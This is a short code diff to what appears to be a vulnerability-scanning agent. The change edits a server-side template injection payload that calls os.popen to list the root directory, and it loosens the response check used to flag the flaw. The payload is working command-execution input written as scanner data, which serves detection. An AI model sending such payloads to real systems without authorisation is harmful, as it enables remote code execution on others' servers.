@@ -90,7 +90,7 @@ class MultiVulnAgent(agent.Agent, agent_report_vulnerability_mixin.AgentReportVu
 
         # Payload SSTI untuk mencoba mengeksekusi kode
         payloads = [
-            "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la').read() }}",
+            "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls -la /').read() }}",
         ]
 
         for payload in payloads:
@@ -100,7 +100,7 @@ class MultiVulnAgent(agent.Agent, agent_report_vulnerability_mixin.AgentReportVu
                 response = requests.post(url, json=data, timeout=5)
                 
                 # Periksa apakah respons mengandung indikasi SSTI
-                if "bin" in response.text or "root:" in response.text:
+                if "app" in response.text or "root" in response.text or "tmp" in response.text:
 
                     location = agent_report_vulnerability_mixin.VulnerabilityLocation(
                         metadata=[{"type": "URL", "value": target_url}]
